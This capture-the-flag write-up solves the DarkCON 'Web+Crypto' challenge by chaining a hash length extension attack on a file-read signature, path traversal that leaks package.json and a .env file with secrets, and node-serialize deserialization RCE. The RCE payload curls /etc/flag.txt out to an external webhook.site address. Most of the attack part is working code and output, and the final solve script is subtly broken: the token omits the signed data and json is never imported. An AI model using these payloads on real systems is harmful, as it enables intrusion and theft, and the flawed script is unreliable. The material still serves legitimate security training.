# Web+Crypto (3 solves / 498 points)
Made this website where you can read files 
Note: Flag at /etc/flag.txt

## Soure Code:
* [Source Code](https://github.com/karma9874/My-CTF-Challenges/tree/main/DarkCON-ctf/Misc/Web%2BCrypto)

## TL;DR
/readfile is vulnerable to length extension attack, so read source file of web app and exploiting the node-deserialization attack

## Solution

So from webpage source code we see that there are total 3 funionality of the web app registration,login,readfile

After login we get token using that token to readfile we can read the `68696e742e747874` (hex decode as hint.txt)

```bash
root@KARMA:/# curl -XPOST -H "Content-Type: application/json" -d '{"username":"karma","password":"karma"}' http://web-crypto.darkarmy.xyz/login
{"token":"eyJ1bmFtZSI6Imthcm1hIiwiaWQiOjEyfQ==--RkBc/sh6/qVSgIjEBoBrQ4WKqI4="}
```

```bash
root@KARMA:/# curl -XPOST -H "Content-Type: application/json" -d '{"token": "eyJ1bmFtZSI6Imthcm1hIiwiaWQiOjEyfQ==--RkBc/sh6/qVSgIjEBoBrQ4WKqI4=", "filename": "68696e742e747874", "sig":"e524127241021563a97661ef821d914fc838a942470f4ce9d3cbeaf75a666e01"}' http://web-crypto.darkarmy.xyz/readfile
{"filedata":"Implementing MAC and adding cheese to it pfftt...easy,btw cheese length is less than 30 chars xD\n"}
```

`Implementing MAC and adding cheese to it and cheese length is less than 30 chars`  -> this suggest it to length extension attack with password length less than 30 chars given

Web app is running on nodejs so `package.json` must be present on the system

We get the contents of package.json at `22` so password length is `22`

```py
import hashpumpy
import requests
import json
import binascii
for i in range(1,30):
  sig,inp = hashpumpy.hashpump("e524127241021563a97661ef821d914fc838a942470f4ce9d3cbeaf75a666e01","hint.txt","/../package.json",i)
  filename = binascii.hexlify(inp).decode()
  url = 'http://web-crypto.darkarmy.xyz/readfile'
  myobj = {"token": "eyJ1bmFtZSI6Imthcm1hIiwiaWQiOjEyfQ==--RkBc/sh6/qVSgIjEBoBrQ4WKqI4=","filename":filename,"sig":sig}
  x = requests.post(url, data = json.dumps(myobj),headers ={"Content-Type":"application/json"})
  print(x.text)

# response 
# {"filedata":"{\n  \"name\": \"web_crypto\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"body-parser\": \"^1.19.0\",\n    \"dotenv\": \"^8.2.0\",\n    \"ejs\": \"^3.1.5\",\n    \"express\": \"^4.17.1\",\n    \"mysql\": \"^2.18.1\",\n    \"node-serialize\": \"0.0.4\",\n    \"cluster\": \"^0.7.7\"\n  }\n}\n"}

```
From the response we can also read the `app.js` which leads to the file `/models/User.js` 

`node-serialize` is used in User.js for creating the user specific `token`

```js
encrypter(user) {
    var shasum = crypto.createHmac('sha1',process.env.AUTH_SECRET);
    var data = Buffer.from(serialize.serialize(user)).toString('base64') 
    return data+"--"+shasum.update(data).digest('base64'); 
    }

  decrypter(token) {
    return new Promise(function(resolve,reject){
    var data = token.split("--")
    var shasum = crypto.createHmac('sha1',process.env.AUTH_SECRET);
    if(data[1] === shasum.update(data[0]).digest('base64')){
        try{
          return resolve(serialize.unserialize(Buffer.from(data[0], 'base64').toString()))
        }catch(err){
          return reject(err.message);
        }
    }else{
      return reject("Trying to hack? lol")
    }});
  }
````

A little bit of google search for `node-serialize` leads to that the npm package is vulnerable to node-deserialization rce attack 

```js
app.post('/readfile',(req,res)=>{
  var token = req.body.token
  var sig = req.body.sig
  var name = req.body.filename
  console.log(token+sig+name)
  if(token && sig && name){
    var userobj = new User().decrypter(token).then(function(obj){
      filename = Buffer.from(name,'hex').toString('binary')
      new User().access_file(filename,sig).then(function(data){
        res.json({"filedata":data})
      }).catch(function(err){
        res.json({"err":err})
      })
    }).catch(function(err){
        res.json({"err":err})
      });
  }else{
    res.json({"err":"Invalid request"})
  }
});
```

And from `readfile` route we can check that the app first verifies the token and then forwards it to `decrypter` function which calls the `unserialize` function which can give rce

So for that to work we need to sign our payload with valid signature, so the AUTH_SECRET is comming from .env file which we can easily read it

.env file
```
DB_HOST=wc_mysql
DB_USER=root
DB_NAME=scam
nDB_PASS=scammer@123
HASH_SECRET=testingallthewayintoit
AUTH_SECRET=abhikliyekuchbhitestingkar
```

Solution Script
```py
from hashlib import sha1
import hmac
import requests

# {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('curl -XPOST --data-binary \"@/etc/flag.txt\" https://webhook.site/eb800bdc-e7a9-4765-852b-1a6513b56f4d', function(error, stdout, stderr) { console.log(stdout)});}()"}

raw = "eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLVhQT1NUIC0tZGF0YS1iaW5hcnkgXCJAL2V0Yy9mbGFnLnR4dFwiIGh0dHBzOi8vd2ViaG9vay5zaXRlL2ViODAwYmRjLWU3YTktNDc2NS04NTJiLTFhNjUxM2I1NmY0ZCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpfSk7fSgpIn0="

key = "abhikliyekuchbhitestingkar"
hashed = hmac.new(key, raw, sha1)
payload_token = hashed.digest().encode('base64')
url = 'http://web-crypto.darkarmy.xyz/readfile'
myobj = {"token": payload_token,"filename":"68696e742e747874","sig":"e524127241021563a97661ef821d914fc838a942470f4ce9d3cbeaf75a666e01"}
x = requests.post(url, data = json.dumps(myobj),headers ={"Content-Type":"application/json"})
print(x.text)
```

## Flag
> darkCON{l3ngth_3xt3ns10n_2_n0d3_s3r1411z3_brrrrr_xD}